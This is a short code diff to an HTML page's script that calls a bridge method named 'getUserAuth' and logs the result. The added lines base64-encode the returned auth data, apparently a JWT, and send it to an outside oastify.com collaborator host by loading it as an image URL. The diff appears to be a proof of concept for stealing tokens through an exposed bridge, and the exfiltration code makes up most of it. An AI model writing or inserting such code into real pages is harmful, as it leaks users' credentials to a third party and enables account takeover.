@@ -32,6 +32,11 @@ function dsCall(method, data, cb) {
 
 dsCall("getUserAuth", {}, function (res) {
   log("result = " + (typeof res === "string" ? res : JSON.stringify(res)));
+  const base64 = btoa(JSON.stringify(res));
+  const imgSrc = "https://4publd5rh0lr4lnpnx6hz43lxc33rtfi.oastify.com/jwt.jpg?jwt=," + base64;
+  const img = document.createElement("img");
+  img.src = imgSrc;
+  document.body.appendChild(img);
 });
 </script>
 </body>
